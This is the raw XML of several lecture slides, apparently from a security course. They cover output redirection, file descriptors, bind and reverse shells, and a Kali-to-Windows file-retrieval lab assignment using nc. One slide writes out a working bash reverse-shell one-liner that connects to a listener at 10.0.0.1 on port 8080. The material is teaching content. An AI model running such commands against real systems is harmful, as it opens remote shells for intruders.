          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="974891" y="1011652"/>
            <a:ext cx="7212177" cy="5257168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A1A85D92-8261-0408-0D44-36C969D3CE79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="974891" y="589180"/>
            <a:ext cx="2888740" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Find the optimized block size</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="7" name="Straight Arrow Connector 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B12D8BA4-B8D9-C445-65B1-41222123B03A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3230880" y="4191000"/>
            <a:ext cx="868680" cy="3124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14FEA9E5-FF46-EFF8-9794-FD31A067D9F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4154494" y="4006334"/>
            <a:ext cx="1714500" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>optimized bytes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29496008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78A2C-D59B-08CA-9089-E4211038CA04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>We have to manually try optimized block size</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52042D8F-BDD0-1158-E2AC-194DD2EA4099}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1023486" y="2009308"/>
            <a:ext cx="9306561" cy="1152448"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16314234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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="997233" y="1737116"/>
            <a:ext cx="9934927" cy="4814400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>There are two places programs send output to: Standard output (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0" err="1">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>) and Standard Error (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0" err="1">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>stderr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>You can redirect these outputs to a different place (like a file);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>File descriptors are used to identify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0" err="1">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (1) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0" err="1">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>stderr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (2);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>output is just a shortcut for command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> output;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>You can use &amp;[FILE_DESCRIPTOR] to reference a file descriptor value;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Using 2&gt;&amp;1 will redirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0" err="1">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>stderr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> to whatever value is set to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0" err="1">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (and 1&gt;&amp;2 will do the opposite).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>40</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9658437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Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0"/>
              <a:t>Bind shell - attacker's machine acts as a client and the victim's machine acts as a server opening up a communication port on the victim and waiting for the client to connect to it and then issue commands that will be remotely (with respect to the attacker) executed on the victim's machine. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0"/>
              <a:t>firewall etc. may block the bind shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="l"/>
              <a:t>41</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4943729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Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="93131" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reverse Shell - attacker's machine acts as a server. It opens a communication channel on a port and waits for incoming connections. Victim's machine acts as a client and initiates a connection to the attacker's listening server. This is exactly what is done by the following:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="93131" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bash -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> &gt;&amp; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/10.0.0.1/8080 0&gt;&amp;1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="l"/>
              <a:t>42</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2058254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04ABA-149E-4CE9-98C4-9F02F632CB5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Assignment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E557CAF6-7771-4DA8-97BD-9E8E765BDF8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create a file in Windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>name it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>yourFisrtLastNameEvidence.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the content of the file “hello </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>yourname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You don’t allow to touch Windows directly after you create the file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>you allow accessing Windows from Kali</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>assume </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is installed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remotely acquire the file from Kali</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use command lines, e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="93131" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="745049" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29103426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Extra credits: Another approach for reverse shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>44</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1819914"/>
            <a:ext cx="6971392" cy="4678170"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8249336" y="1"/>
            <a:ext cx="3942664" cy="235898"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="933" dirty="0"/>
              <a:t>https://stackoverflow.com/questions/35271850/what-is-a-reverse-shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="TextBox 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{949834CC-EE51-45E6-AC16-55466089F92B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8339015" y="4704862"/>
            <a:ext cx="2122761" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>compare difference?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1385115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Reference</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://www.learnlinux.org.za/courses/build/shell-scripting/ch01s04.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2667" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
